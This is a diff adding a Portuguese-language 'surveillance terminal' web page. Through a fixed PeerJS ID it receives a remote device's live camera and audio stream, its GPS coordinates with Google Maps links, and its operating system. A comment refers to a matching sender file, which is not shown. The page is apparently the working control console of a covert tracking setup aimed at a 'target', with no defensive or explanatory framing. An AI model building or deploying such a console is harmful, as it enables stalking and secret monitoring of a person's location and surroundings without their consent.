@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>TERMINAL DE VIGILÂNCIA ALPHA</title>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        :root { --neon-green: #00ff41; --dark-bg: #050505; }
+        body { background: var(--dark-bg); color: var(--neon-green); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        
+        /* Lateral Esquerda: Logs e GPS */
+        #side-bar { width: 350px; border-right: 2px solid var(--neon-green); padding: 20px; display: flex; flex-direction: column; background: rgba(0, 20, 0, 0.9); }
+        .log-box { flex-grow: 1; overflow-y: auto; border: 1px solid #004400; padding: 10px; font-size: 0.85em; margin-bottom: 10px; }
+        .log-entry { margin-bottom: 8px; border-bottom: 1px solid #002200; padding-bottom: 4px; }
+        
+        /* Área Principal: Vídeo */
+        #main-view { flex-grow: 1; position: relative; display: flex; align-items: center; justify-content: center; background: #000; }
+        video { width: 100%; height: 100%; object-fit: contain; filter: sepia(20%) contrast(120%); }
+        
+        /* Interface de ativação */
+        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--dark-bg); z-index: 100; display: flex; align-items: center; justify-content: center; }
+        .btn-init { background: transparent; border: 2px solid var(--neon-green); color: var(--neon-green); padding: 20px 40px; font-size: 1.5em; cursor: pointer; box-shadow: 0 0 15px var(--neon-green); }
+        
+        .map-link { color: #fff; background: #008800; text-decoration: none; padding: 2px 5px; border-radius: 3px; font-size: 0.8em; }
+        .status-dot { height: 10px; width: 10px; background-color: #f00; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .online { background-color: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); }
+    </style>
+</head>
+<body>
+
+<div id="overlay">
+    <button class="btn-init" onclick="initMonitor()">INICIAR RECEPÇÃO DE SINAL</button>
+</div>
+
+<div id="side-bar">
+    <h2>[ CENTRAL ]</h2>
+    <div id="conn-info"><span id="dot" class="status-dot"></span> STATUS: <span id="st-text">OFFLINE</span></div>
+    <hr color="#004400">
+    <h4>TELEMETRIA GPS</h4>
+    <div id="log-container" class="log-box"></div>
+    <div id="target-info" style="font-size: 0.7em; color: #888;"></div>
+</div>
+
+<div id="main-view">
+    <video id="remoteVideo" autoplay playsinline></video>
+</div>
+
+<script>
+    const MEU_ID_UNICO = "SINAL_OPERACIONAL_777"; // Mantenha este ID igual no outro arquivo
+    let peer;
+
+    function initMonitor() {
+        document.getElementById('overlay').style.display = 'none';
+        peer = new Peer(MEU_ID_UNICO);
+
+        peer.on('open', (id) => {
+            document.getElementById('st-text').innerText = "OUVINDO SINAL...";
+            document.getElementById('dot').classList.add('online');
+        });
+
+        // Recebe Fluxo de Vídeo/Áudio
+        peer.on('call', (call) => {
+            call.answer(); 
+            call.on('stream', (stream) => {
+                const video = document.getElementById('remoteVideo');
+                video.srcObject = stream;
+                video.play().catch(e => console.log("Erro ao dar play:", e));
+                document.getElementById('st-text').innerText = "CONEXÃO ATIVA";
+            });
+        });
+
+        // Recebe Coordenadas e Dados do Dispositivo
+        peer.on('connection', (conn) => {
+            conn.on('data', (data) => {
+                const container = document.getElementById('log-container');
+                const time = new Date().toLocaleTimeString();
+                
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+                entry.innerHTML = `
+                    <strong>[${time}]</strong> LAT: ${data.lat.toFixed(4)} LON: ${data.lon.toFixed(4)}<br>
+                    <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="map-link">ABRIR GOOGLE MAPS</a>
+                `;
+                container.prepend(entry);
+                document.getElementById('target-info').innerText = "DISPOSITIVO: " + data.os;
+            });
+        });
+    }
+</script>
+</body>
+</html>
